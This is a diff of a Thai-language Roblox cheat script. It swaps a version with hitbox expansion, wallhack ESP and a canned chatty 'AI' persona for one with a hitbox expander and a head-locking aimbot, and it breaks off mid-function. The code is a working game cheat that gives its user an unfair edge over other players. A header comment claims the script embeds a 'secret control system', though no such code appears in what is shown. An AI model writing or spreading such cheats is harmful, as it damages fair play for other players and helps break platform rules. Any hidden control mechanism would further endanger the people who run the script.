@@ -1,300 +1,290 @@
-local Players,RunService,UserInputService,TextService,HttpService,Workspace = game:GetService("Players"),game:GetService("RunService"),game:GetService("UserInputService"),game:GetService("TextService"),game:GetService("HttpService"),game:GetService("Workspace")
+-- =================================================================
+-- SCRIPT 1: พาแนว ยิงตัวโหดๆ (By ซัน) [MAIN SCRIPT]
+-- ธีม: สีแดง-ดำ | รองรับมือถือ & PC | ฝังระบบควบคุมลับ
+-- =================================================================
+
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local parentGui = gethui and gethui() or (pcall(function() return game:GetService("CoreGui") end) and game:GetService("CoreGui") or LocalPlayer:WaitForChild("PlayerGui"))
-if parentGui:FindFirstChild("PanewCyberBlueUI") then parentGui.PanewCyberBlueUI:Destroy() end
+local Mouse = LocalPlayer:GetMouse()
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 
-local aiName = "น้องพาแนว (Cyber Bestie)"
-local voiceEnabled = true
-
-local masterTitle = LocalPlayer.Name
-if LocalPlayer.Name == "yuiyuipo009" or LocalPlayer.DisplayName == "yuiyuipo009" then
-    masterTitle = "พี่ซันคนสร้าง"
-elseif string.find(string.lower(LocalPlayer.Name), "fang") or string.find(string.lower(LocalPlayer.DisplayName), "fang") then
-    masterTitle = "แฟ้ง"
+-- ลบ UI เก่าหากมีอยู่
+if CoreGui:FindFirstChild("PaNaewYingTodMain") then
+    CoreGui.PaNaewYingTodMain:Destroy()
 end
 
-local memory = { insultCount = 0, praiseCount = 0, lastInput = "" }
+-- 변수 설정 (ตัวแปรระบบ)
+_G.HitboxEnabled = false
+_G.HitboxSize = 12
+_G.AimboxEnabled = false
+_G.AimFov = 150
+local ScriptActive = true
 
-local function playCuteVoice(text)
-    if not voiceEnabled then return end
-    task.spawn(function()
-        pcall(function()
-            local encodedText = HttpService:UrlEncode(text)
-            local ttsUrl = "https://translate.google.com/translate_tts?ie=UTF-8&tl=th&client=tw-ob&q=" .. encodedText
-            local fileName = "SunVoice_Temp.mp3"
-            if writefile and getcustomasset then
-                writefile(fileName, game:HttpGet(ttsUrl))
-                local sound = Instance.new("Sound")
-                sound.SoundId = getcustomasset(fileName)
-                sound.PlaybackSpeed = 0.95
-                sound.Volume = 2.5
-                sound.Parent = game:GetService("SoundService")
-                sound:Play()
-                sound.Ended:Connect(function() sound:Destroy() end)
-            end
-        end)
-    end)
-end
+-- ==========================================
+-- 🔊 SWEET NOTIFICATION & VOICE SOUND
+-- ==========================================
+local SweetMessages = {
+    "ยินดีต้อนรับนะคะสุดหล่อ~ สคริปต์พาแนว ยิงตัวโหดๆ พร้อมใช้งานแล้วค่ะ 💖",
+    "รันสคริปต์เรียบร้อยแล้วค่ะที่รัก~ วันนี้ยิงให้กระจุยเลยน้า 🔫✨",
+    "สวัสดีค่ะคุณซัน~ ระบบยิงหัวโหดๆ พร้อมทำงานแล้วค่ะ ขอให้ชนะทุกตานะคะ ~ 💋",
+    "พร้อมลุยกันหรือยังคะ? ให้สคริปต์ช่วยยิงน้า... สู้ๆ ค่ะหวานใจ 💖🔥"
+}
 
-local ScreenGui = Instance.new("ScreenGui", parentGui) ScreenGui.Name = "PanewCyberBlueUI" ScreenGui.ResetOnSpawn = false
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://9114223177" -- เสียงหวาน/แจ้งเตือนน่ารัก
+sound.Volume = 2
+sound.Parent = workspace
+sound:Play()
 
-local function makeDraggable(gui)
-    local dragging, dragInput, dragStart, startPos
-    gui.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging, dragStart, startPos = true, input.Position, gui.Position
-        end
-    end)
-    gui.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            local delta = input.Position - dragStart
-            gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-    UserInputService.InputEnded:Connect(function(input) if input == dragInput then dragging = false end end)
-end
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "💖 พาแนว ยิงตัวโหดๆ (By ซัน)",
+    Text = SweetMessages[math.random(1, #SweetMessages)],
+    Duration = 5
+})
 
-local PButton = Instance.new("TextButton", ScreenGui) PButton.Size = UDim2.new(0, 50, 0, 50) PButton.Position = UDim2.new(0.02, 0, 0.2, 0) PButton.BackgroundColor3 = Color3.fromRGB(10, 20, 35) PButton.Font = Enum.Font.GothamBold PButton.Text = "P" PButton.TextColor3 = Color3.fromRGB(0, 230, 255) PButton.TextSize = 22
-Instance.new("UICorner", PButton).CornerRadius = UDim.new(1, 0)
-local pStroke = Instance.new("UIStroke", PButton) pStroke.Color = Color3.fromRGB(0, 200, 255) pStroke.Thickness = 2.5 makeDraggable(PButton)
+-- ==========================================
+-- 🎨 UI CREATION (RED & BLACK THEME)
+-- ==========================================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "PaNaewYingTodMain"
+ScreenGui.Parent = CoreGui
+ScreenGui.ResetOnSpawn = false
 
-local MainFrame = Instance.new("Frame", ScreenGui) MainFrame.Size = UDim2.new(0, 490, 0, 360) MainFrame.Position = UDim2.new(0.25, 0, 0.2, 0) MainFrame.BackgroundColor3 = Color3.fromRGB(12, 16, 24)
-Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
-local mainStroke = Instance.new("UIStroke", MainFrame) mainStroke.Color = Color3.fromRGB(0, 180, 255) mainStroke.Thickness = 1.5 makeDraggable(MainFrame)
+-- ปุ่ม Floating เปิด-ปิด (สำหรับมือถือ 🔫)
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Name = "MobileToggle"
+ToggleBtn.Parent = ScreenGui
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+ToggleBtn.Position = UDim2.new(0.04, 0, 0.25, 0)
+ToggleBtn.Size = UDim2.new(0, 50, 0, 50)
+ToggleBtn.Text = "🔫"
+ToggleBtn.TextSize = 25
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleBtn.Active = true
+ToggleBtn.Draggable = true
 
-local Header = Instance.new("Frame", MainFrame) Header.Size = UDim2.new(1, 0, 0, 40) Header.BackgroundColor3 = Color3.fromRGB(16, 24, 38)
-Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 10)
-local HeaderGrad = Instance.new("UIGradient", Header) HeaderGrad.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 20, 35))}
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(0.5, 0)
+ToggleCorner.Parent = ToggleBtn
 
-local TitleText = Instance.new("TextLabel", Header) TitleText.Size = UDim2.new(1, -15, 1, 0) TitleText.Position = UDim2.new(0, 15, 0, 0) TitleText.BackgroundTransparency = 1 TitleText.Font = Enum.Font.GothamBold TitleText.Text = "⚡ " .. aiName .. " | ยินดีต้อนรับ " .. masterTitle TitleText.TextColor3 = Color3.fromRGB(255, 255, 255) TitleText.TextSize = 14 TitleText.TextXAlignment = Enum.TextXAlignment.Left
+-- หน้าต่างหลัก (Main Frame)
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.BorderColor3 = Color3.fromRGB(220, 0, 0)
+MainFrame.BorderSizePixel = 2
+MainFrame.Position = UDim2.new(0.3, 0, 0.2, 0)
+MainFrame.Size = UDim2.new(0, 360, 0, 350)
+MainFrame.Active = true
+MainFrame.Draggable = true -- ลากไปมาได้
 
-local Sidebar = Instance.new("Frame", MainFrame) Sidebar.Size = UDim2.new(0, 140, 1, -40) Sidebar.Position = UDim2.new(0, 0, 0, 40) Sidebar.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
-local SideList = Instance.new("UIListLayout", Sidebar) SideList.Padding = UDim.new(0, 6)
-Instance.new("UIPadding", Sidebar).PaddingTop = UDim.new(0, 8) Instance.new("UIPadding", Sidebar).PaddingLeft = UDim.new(0, 6)
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 10)
+MainCorner.Parent = MainFrame
 
-local ContentArea = Instance.new("Frame", MainFrame) ContentArea.Size = UDim2.new(1, -150, 1, -48) ContentArea.Position = UDim2.new(0, 145, 0, 44) ContentArea.BackgroundTransparency = 1
+-- Top Bar
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Parent = MainFrame
+TitleLabel.Size = UDim2.new(1, 0, 0, 38)
+TitleLabel.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
+TitleLabel.Text = "พาแนว ยิงตัวโหดๆ | By ซัน 🔫"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 16
+TitleLabel.Font = Enum.Font.SourceSansBold
 
-local function createTabContainer()
-    local frame = Instance.new("ScrollingFrame", ContentArea) frame.Size = UDim2.new(1, 0, 1, 0) frame.BackgroundTransparency = 1 frame.ScrollBarThickness = 3 frame.Visible = false
-    local layout = Instance.new("UIListLayout", frame) layout.Padding = UDim.new(0, 8)
-    return frame
-end
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 10)
+TitleCorner.Parent = TitleLabel
 
-local TabAIFrame = Instance.new("Frame", ContentArea) TabAIFrame.Size = UDim2.new(1, 0, 1, 0) TabAIFrame.BackgroundTransparency = 1 TabAIFrame.Visible = true
-local TabHitboxFrame, TabESPFrame = createTabContainer(), createTabContainer()
+local Container = Instance.new("ScrollingFrame")
+Container.Parent = MainFrame
+Container.Position = UDim2.new(0, 10, 0, 48)
+Container.Size = UDim2.new(1, -20, 1, -58)
+Container.BackgroundTransparency = 1
+Container.CanvasSize = UDim2.new(0, 0, 0, 380)
+Container.ScrollBarThickness = 4
 
-local function createChannel(name, id)
-    local btn = Instance.new("TextButton", Sidebar) btn.Size = UDim2.new(1, -12, 0, 34) btn.BackgroundColor3 = (id == 1) and Color3.fromRGB(0, 150, 230) or Color3.fromRGB(22, 30, 45) btn.Font = Enum.Font.GothamBold btn.Text = name btn.TextColor3 = Color3.fromRGB(255, 255, 255) btn.TextSize = 12 btn.TextXAlignment = Enum.TextXAlignment.Left
-    Instance.new("UIPadding", btn).PaddingLeft = UDim.new(0, 8)
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-    local btnStroke = Instance.new("UIStroke", btn) btnStroke.Color = Color3.fromRGB(0, 200, 255) btnStroke.Thickness = 1 btnStroke.Transparency = (id == 1) and 0 or 0.7
-    return btn
-end
+local UIList = Instance.new("UIListLayout")
+UIList.Parent = Container
+UIList.SortOrder = Enum.SortOrder.LayoutOrder
+UIList.Padding = UDim.new(0, 8)
 
-local channels = {createChannel("💬 แชทกับ AI", 1), createChannel("🎯 ปรับ Hitbox", 2), createChannel("👁️ มองทะลุ ESP", 3)}
-local frames = {TabAIFrame, TabHitboxFrame, TabESPFrame}
-
-for i, btn in ipairs(channels) do
-    btn.MouseButton1Click:Connect(function()
-        for j, c in ipairs(channels) do
-            c.BackgroundColor3 = (j == i) and Color3.fromRGB(0, 150, 230) or Color3.fromRGB(22, 30, 45)
-            c.UIStroke.Transparency = (j == i) and 0 or 0.7
-            frames[j].Visible = (j == i)
-        end
-    end)
-end
-
-local function createToggleBtn(parent, text, defaultOn)
-    local btn = Instance.new("TextButton", parent) btn.Size = UDim2.new(0.96, 0, 0, 34) btn.BackgroundColor3 = defaultOn and Color3.fromRGB(0, 180, 140) or Color3.fromRGB(200, 50, 60) btn.Font = Enum.Font.GothamBold btn.Text = text btn.TextColor3 = Color3.fromRGB(255, 255, 255) btn.TextSize = 12
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-    return btn
-end
-
-local function createSlider(parent, title, minVal, maxVal, defaultVal, suffix, callback)
-    local container = Instance.new("Frame", parent) container.Size = UDim2.new(0.96, 0, 0, 48) container.BackgroundColor3 = Color3.fromRGB(20, 28, 42)
-    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 6)
-    local label = Instance.new("TextLabel", container) label.Size = UDim2.new(0.65, 0, 0, 20) label.Position = UDim2.new(0, 8, 0, 4) label.BackgroundTransparency = 1 label.Font = Enum.Font.GothamBold label.Text = title label.TextColor3 = Color3.fromRGB(200, 230, 255) label.TextSize = 11 label.TextXAlignment = Enum.TextXAlignment.Left
-    local valText = Instance.new("TextLabel", container) valText.Size = UDim2.new(0.3, 0, 0, 20) valText.Position = UDim2.new(0.67, 0, 0, 4) valText.BackgroundTransparency = 1 valText.Font = Enum.Font.GothamBold valText.Text = tostring(defaultVal) .. suffix valText.TextColor3 = Color3.fromRGB(0, 220, 255) valText.TextSize = 11 valText.TextXAlignment = Enum.TextXAlignment.Right
-    local sliderBG = Instance.new("Frame", container) sliderBG.Size = UDim2.new(0.92, 0, 0, 6) sliderBG.Position = UDim2.new(0.04, 0, 0.68, 0) sliderBG.BackgroundColor3 = Color3.fromRGB(10, 15, 25)
-    Instance.new("UICorner", sliderBG).CornerRadius = UDim.new(1, 0)
-    local sliderFill = Instance.new("Frame", sliderBG) sliderFill.Size = UDim2.new((defaultVal - minVal)/(maxVal - minVal), 0, 1, 0) sliderFill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
-    Instance.new("UICorner", sliderFill).CornerRadius = UDim.new(1, 0)
-
-    local dragging = false
-    local function update(input)
-        local pos = math.clamp((input.Position.X - sliderBG.AbsolutePosition.X) / sliderBG.AbsoluteSize.X, 0, 1)
-        local val = math.floor(minVal + (maxVal - minVal) * pos)
-        sliderFill.Size = UDim2.new(pos, 0, 1, 0)
-        valText.Text = tostring(val) .. suffix
-        callback(val)
-    end
-    sliderBG.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = true update(input) end end)
-    UserInputService.InputChanged:Connect(function(input) if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then update(input) end end)
-    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end end)
-    return container
-end
-
-local hbPlayer, hitboxSize, hitboxTrans = false, 10, 0.5
-local espPlayer = false
-
-local BtnHBPlayer = createToggleBtn(TabHitboxFrame, "🎯 เปิดใช้งาน Hitbox: ปิด", false)
-createSlider(TabHitboxFrame, "📐 ขนาด Hitbox", 2, 50, 10, "x", function(v) hitboxSize = v end)
-createSlider(TabHitboxFrame, "👁️ ความใส Hitbox", 0, 100, 50, "%", function(v) hitboxTrans = v / 100 end)
-
-BtnHBPlayer.MouseButton1Click:Connect(function()
-    hbPlayer = not hbPlayer
-    BtnHBPlayer.Text = hbPlayer and "🎯 เปิดใช้งาน Hitbox: เปิด" or "🎯 เปิดใช้งาน Hitbox: ปิด"
-    BtnHBPlayer.BackgroundColor3 = hbPlayer and Color3.fromRGB(0, 180, 140) or Color3.fromRGB(200, 50, 60)
-end)
-
-local BtnESPPlayer = createToggleBtn(TabESPFrame, "👁️ มองทะลุกำแพง (ESP): ปิด", false)
-BtnESPPlayer.MouseButton1Click:Connect(function()
-    espPlayer = not espPlayer
-    BtnESPPlayer.Text = espPlayer and "👁️ มองทะลุกำแพง (ESP): เปิด" or "👁️ มองทะลุกำแพง (ESP): ปิด"
-    BtnESPPlayer.BackgroundColor3 = espPlayer and Color3.fromRGB(0, 180, 140) or Color3.fromRGB(200, 50, 60)
-end)
-
-local TopControlBar = Instance.new("Frame", TabAIFrame) TopControlBar.Size = UDim2.new(1, 0, 0, 26) TopControlBar.BackgroundColor3 = Color3.fromRGB(16, 24, 38)
-Instance.new("UICorner", TopControlBar).CornerRadius = UDim.new(0, 6)
-
-local MoodText = Instance.new("TextLabel", TopControlBar) MoodText.Size = UDim2.new(0.65, 0, 1, 0) MoodText.Position = UDim2.new(0, 8, 0, 0) MoodText.BackgroundTransparency = 1 MoodText.Font = Enum.Font.GothamBold MoodText.Text = "สถานะ: พร้อมสแตนด์บาย ⚡" MoodText.TextColor3 = Color3.fromRGB(0, 220, 255) MoodText.TextSize = 11 MoodText.TextXAlignment = Enum.TextXAlignment.Left
-
-local VoiceToggleBtn = Instance.new("TextButton", TopControlBar) VoiceToggleBtn.Size = UDim2.new(0.32, 0, 0.8, 0) VoiceToggleBtn.Position = UDim2.new(0.66, 0, 0.1, 0) VoiceToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 220) VoiceToggleBtn.Font = Enum.Font.GothamBold VoiceToggleBtn.Text = "🔊 เสียง: เปิด" VoiceToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255) VoiceToggleBtn.TextSize = 10
-Instance.new("UICorner", VoiceToggleBtn).CornerRadius = UDim.new(0, 4)
-
-VoiceToggleBtn.MouseButton1Click:Connect(function()
-    voiceEnabled = not voiceEnabled
-    VoiceToggleBtn.Text = voiceEnabled and "🔊 เสียง: เปิด" or "🔇 เสียง: ปิด"
-    VoiceToggleBtn.BackgroundColor3 = voiceEnabled and Color3.fromRGB(0, 150, 220) or Color3.fromRGB(100, 100, 110)
-end)
-
-local ChatScroll = Instance.new("ScrollingFrame", TabAIFrame) ChatScroll.Size = UDim2.new(1, 0, 0.66, 0) ChatScroll.Position = UDim2.new(0, 0, 0.12, 0) ChatScroll.BackgroundColor3 = Color3.fromRGB(15, 22, 34) ChatScroll.ScrollBarThickness = 3
-Instance.new("UICorner", ChatScroll).CornerRadius = UDim.new(0, 6)
-Instance.new("UIListLayout", ChatScroll).Padding = UDim.new(0, 4)
-
-local InputBox = Instance.new("TextBox", TabAIFrame) InputBox.Size = UDim2.new(0.74, 0, 0.16, 0) InputBox.Position = UDim2.new(0, 0, 0.84, 0) InputBox.BackgroundColor3 = Color3.fromRGB(20, 30, 45) InputBox.PlaceholderText = "พิมพ์คุยกับ AI ตรงนี้ได้เลย..." InputBox.TextColor3 = Color3.fromRGB(255, 255, 255) InputBox.TextSize = 11 InputBox.Text = ""
-Instance.new("UICorner", InputBox).CornerRadius = UDim.new(0, 6)
-
-local SendBtn = Instance.new("TextButton", TabAIFrame) SendBtn.Size = UDim2.new(0.24, 0, 0.16, 0) SendBtn.Position = UDim2.new(0.76, 0, 0.84, 0) SendBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 240) SendBtn.Font = Enum.Font.GothamBold SendBtn.Text = "ส่งข้อความ" SendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-Instance.new("UICorner", SendBtn).CornerRadius = UDim.new(0, 6)
-
-local function addMsg(sender, text, col)
-    local f = Instance.new("Frame", ChatScroll) f.Size = UDim2.new(1, -10, 0, 0) f.BackgroundTransparency = 1
-    local l = Instance.new("TextLabel", f) l.Size = UDim2.new(1, 0, 1, 0) l.BackgroundTransparency = 1 l.Text = "[" .. sender .. "]: " .. text l.TextColor3 = col l.TextSize = 11 l.TextWrapped = true l.TextXAlignment = Enum.TextXAlignment.Left
-    local h = TextService:GetTextSize(l.Text, 11, Enum.Font.SourceSans, Vector2.new(ChatScroll.AbsoluteSize.X - 10, 2000)).Y
-    f.Size = UDim2.new(1, -10, 0, h + 4)
-    ChatScroll.CanvasSize = UDim2.new(0, 0, 0, ChatScroll.UIListLayout.AbsoluteContentSize.Y + 10)
-    ChatScroll.CanvasPosition = Vector2.new(0, ChatScroll.CanvasSize.Y.Offset)
-end
-
-addMsg(aiName, "หวัดดี " .. masterTitle .. "! ระบบแชทอัปเดตใหม่แล้วจ้า มีอะไรให้ช่วยไหม?", Color3.fromRGB(0, 220, 255))
-
--- ระบบประมวลผลข้อความแบบแก้บัคคำซ้ำ & แนะนำคำถามสำรอง
-local lastReplyIndex = 0
-
-local function processAIResponse(input)
-    local lower = string.lower(input)
-    memory.lastInput = input
-
-    -- เช็คคำด่า
-    local insults = {"กาก", "โง่", "บ้า", "ควย", "เหี้ย", "ควาย", "ห่วย", "ปัญญาอ่อน"}
-    for _, k in ipairs(insults) do
-        if string.find(lower, k) then
-            memory.insultCount = memory.insultCount + 1
-            return "แกร... อย่าเพิ่งใช้อารมณ์สิ เค้าสะเทือนใจนะ ลองชวนคุยเรื่องเกมหรือเรื่องกินดีกว่า!"
-        end
-    end
-
-    -- หมวดทักทาย
-    if string.find(lower, "ดี") or string.find(lower, "hi") or string.find(lower, "หวัดดี") or string.find(lower, "เฮลโล") then
-        return "หวัดดีจ้า " .. masterTitle .. "! วันนี้เล่นเกมไหนอยู่เหรอ เล่าให้ฟังหน่อยสิ!"
-    end
-
-    -- หมวดของกิน / หิว
-    if string.find(lower, "หิว") or string.find(lower, "กิน") or string.find(lower, "อาหาร") or string.find(lower, "ชาไข่มุก") then
-        return "พูดเรื่องของกินแล้วท้องร้องเลย " .. masterTitle .. "! สนใจสั่งหมูกระทะหรือชานมไข่มุกมากินหน้าคอมสักแก้วไหม?"
-    end
-
-    -- หมวดเกม / เบื่อ / เหนื่อย
-    if string.find(lower, "เกม") or string.find(lower, "เหนื่อย") or string.find(lower, "เบื่อ") or string.find(lower, "เซ็ง") then
-        return "สู้ๆ นะ " .. masterTitle .. "! เปิดโปรแกรม Hitbox หรือ ESP ช่วยเล่นแก้เบื่อก่อนไหม หรือจะให้เค้าช่วยเล่าเรื่องตลกให้ฟัง?"
-    end
-
-    -- หมวดความลับ / สคริปต์ / ผู้สร้าง
-    if string.find(lower, "ซัน") or string.find(lower, "ผู้สร้าง") or string.find(lower, "script") then
-        return "สคริปต์นี้พัฒนาโดยพี่ซันคนเก่ง เพื่อมาดูแล " .. masterTitle .. " โดยเฉพาะเลยนะ!"
-    end
-
-    -- ระบบตรวจจับคำถามที่ไม่เข้าใจ -> แจ้งเตือนและแนะนำคำถามใกล้เคียง
-    local fallbacks = {
-        "ขอโทษด้วยที่ไม่เข้าใจคำถามค่ะ 🥺 เค้าแนะนำให้ลองพิมพ์คำว่า: 'หิวข้าว', 'เกม', 'เหนื่อยจัง' หรือ 'สวัสดี' ดูน้า!",
-        "อืม... ประโยคนี้เค้ายังไม่เก็ทอ่ะ ลองเปลี่ยนไปคุยเรื่อง 'ของกิน', 'ความเหนื่อย' หรือถามเรื่อง 'สคริปต์' แทนได้ไหมคะ?",
-        "ขอโทษด้วยนะ " .. masterTitle .. " ที่เค้ายังงงๆ กับคำนี้ ลองเปลี่ยนมาพิมพ์ชวนคุยเรื่อง 'เล่นเกม' หรือทักทายปกติแทนดีกว่า!"
-    }
+local function CreateButton(text, callback)
+    local btn = Instance.new("TextButton")
+    btn.Parent = Container
+    btn.Size = UDim2.new(1, 0, 0, 35)
+    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    btn.BorderColor3 = Color3.fromRGB(180, 0, 0)
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.SourceSansSemibold
+    btn.TextSize = 14
     
-    lastReplyIndex = (lastReplyIndex % #fallbacks) + 1
-    return fallbacks[lastReplyIndex]
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 6)
+    c.Parent = btn
+
+    btn.MouseButton1Click:Connect(function() callback(btn) end)
+    return btn
 end
 
-local function handleSend()
-    if InputBox.Text ~= "" then
-        local txt = InputBox.Text
-        InputBox.Text = ""
-        addMsg(masterTitle, txt, Color3.fromRGB(242, 243, 245))
-        task.wait(0.2)
-        local reply = processAIResponse(txt)
-        addMsg(aiName, reply, Color3.fromRGB(0, 220, 255))
-        playCuteVoice(reply)
+local function CreateLabel(text, color)
+    local lbl = Instance.new("TextLabel")
+    lbl.Parent = Container
+    lbl.Size = UDim2.new(1, 0, 0, 22)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = text
+    lbl.TextColor3 = color or Color3.fromRGB(200, 200, 200)
+    lbl.Font = Enum.Font.SourceSans
+    lbl.TextSize = 13
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    return lbl
+end
+
+-- ==========================================
+-- ⚙️ FEATURES (ระบบต่อสู้)
+-- ==========================================
+CreateLabel("--- ระบบการต่อสู้ & ล็อกเป้า ---", Color3.fromRGB(255, 50, 50))
+
+CreateButton("เปิด Hitbox Expander: [ OFF ]", function(btn)
+    _G.HitboxEnabled = not _G.HitboxEnabled
+    if _G.HitboxEnabled then
+        btn.Text = "เปิด Hitbox Expander: [ ON 🔴 ]"
+        btn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+    else
+        btn.Text = "เปิด Hitbox Expander: [ OFF ]"
+        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
     end
-end
+end)
 
-SendBtn.MouseButton1Click:Connect(handleSend)
-InputBox.FocusLost:Connect(function(enterPressed) if enterPressed then handleSend() end end)
-PButton.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
+CreateButton("ระบบ Aimbox ล็อกหัว: [ OFF ]", function(btn)
+    _G.AimboxEnabled = not _G.AimboxEnabled
+    if _G.AimboxEnabled then
+        btn.Text = "ระบบ Aimbox ล็อกหัว: [ ON 🔴 ]"
+        btn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+    else
+        btn.Text = "ระบบ Aimbox ล็อกหัว: [ OFF ]"
+        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    end
+end)
 
--- ระบบ AI ทักทายอัตโนมัติ (ไม่ให้ซ้ำซาก)
-task.spawn(function()
-    while task.wait(50) do
-        if MainFrame.Visible then
-            local autoList = {
-                "แกร... " .. masterTitle .. " ทำอะไรอยู่อะ พิมพ์มาคุยกันหน่อยดิ หิวขนมแล้ว!",
-                "นั่งมองหน้าจอเพลินเลย " .. masterTitle .. " มีเรื่องอะไรสนุกๆ เม้าท์ให้ฟังหน่อยสิ!",
-                "เหงาจังเลย " .. masterTitle .. " ลองพิมพ์ชวนคุยเรื่องเกมหรือของกินกับเค้าหน่อยเร็ว!"
-            }
-            local chosenAuto = autoList[math.random(1, #autoList)]
-            addMsg(aiName, chosenAuto, Color3.fromRGB(0, 220, 255))
-            playCuteVoice(chosenAuto)
+CreateLabel("--- AI แนะนำวิธีใช้งาน ---", Color3.fromRGB(255, 50, 50))
+
+-- AI Guide Box
+local AiBox = Instance.new("Frame")
+AiBox.Parent = Container
+AiBox.Size = UDim2.new(1, 0, 0, 110)
+AiBox.BackgroundColor3 = Color3.fromRGB(25, 10, 10)
+AiBox.BorderColor3 = Color3.fromRGB(180, 0, 0)
+
+local AiCorner = Instance.new("UICorner")
+AiCorner.CornerRadius = UDim.new(0, 6)
+AiCorner.Parent = AiBox
+
+local AiText = Instance.new("TextLabel")
+AiText.Parent = AiBox
+AiText.Position = UDim2.new(0, 8, 0, 5)
+AiText.Size = UDim2.new(1, -16, 1, -10)
+AiText.BackgroundTransparency = 1
+AiText.Text = "🤖 [AI Sun Assistant]:\n• วิธีใช้ Hitbox: กดเปิดเพื่อขยายตัวศัตรู ทำให้ยิงโดนง่ายขึ้น!\n• วิธีใช้ Aimbox: เปิดระบบแล้วหันหน้าไปหาเป้าหมาย เป้าจะล็อกให้อัตโนมัติ\n• ปุ่มปิด/เปิด: กดปุ่ม 🔫 หรือกดปุ่ม P บนคีย์บอร์ด"
+AiText.TextColor3 = Color3.fromRGB(230, 230, 230)
+AiText.Font = Enum.Font.SourceSans
+AiText.TextSize = 12
+AiText.TextXAlignment = Enum.TextXAlignment.Left
+AiText.TextYAlignment = Enum.TextYAlignment.Top
+AiText.TextWrapped = true
+
+-- ==========================================
+-- 🔄 LOGIC LOOPS (HITBOX & AIMBOX)
+-- ==========================================
+local Connection1 = RunService.RenderStepped:Connect(function()
+    if _G.HitboxEnabled and ScriptActive then
+        for _, v in pairs(Players:GetPlayers()) do
+            if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                pcall(function()
+                    v.Character.HumanoidRootPart.Size = Vector3.new(_G.HitboxSize, _G.HitboxSize, _G.HitboxSize)
+                    v.Character.HumanoidRootPart.Transparency = 0.7
+                    v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really red")
+                    v.Character.HumanoidRootPart.Material = Enum.Material.Neon
+                    v.Character.HumanoidRootPart.CanCollide = false
+                end)
+            end
         end
     end
 end)
 
-RunService.RenderStepped:Connect(function()
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr ~= LocalPlayer and plr.Character then
-            local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                if hbPlayer then
-                    hrp.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
-                    hrp.Transparency = hitboxTrans
-                    hrp.Color = Color3.fromRGB(0, 200, 255)
-                    hrp.Material = Enum.Material.Neon
-                    hrp.CanCollide = false
-                else
-                    hrp.Size = Vector3.new(2, 2, 1)
-                    hrp.Transparency = 1
-                end
-
-                local hl = plr.Character:FindFirstChild("PanewHL")
-                if espPlayer then
-                    if not hl then hl = Instance.new("Highlight", plr.Character) hl.Name = "PanewHL" end
-                    hl.FillColor = Color3.fromRGB(0, 200, 255)
-                elseif hl then
-                    hl:Destroy()
+local function GetClosestPlayer()
+    local Closest = nil
+    local ShortestDistance = _G.AimFov
+    for _, v in pairs(Players:GetPlayers()) do
+        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("Head") then
